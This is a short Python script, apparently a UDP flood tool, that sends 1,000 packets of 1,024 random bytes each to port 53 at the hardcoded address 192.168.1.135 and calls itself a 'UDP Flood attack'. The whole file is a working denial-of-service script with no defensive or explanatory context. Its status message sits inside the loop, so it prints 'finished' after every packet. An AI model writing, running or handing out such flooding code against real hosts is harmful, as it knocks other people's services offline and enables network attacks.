import socket
import random

target_ip = "192.168.1.135"
target_port = 53

packet_size = 1024
packet_count = 1000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for _ in range(packet_count):
    packet = bytes(random.getrandbits(8) for _ in range(packet_size))
    sock.sendto(packet, (target_ip, target_port))

    print("UDP Flood attack finished!")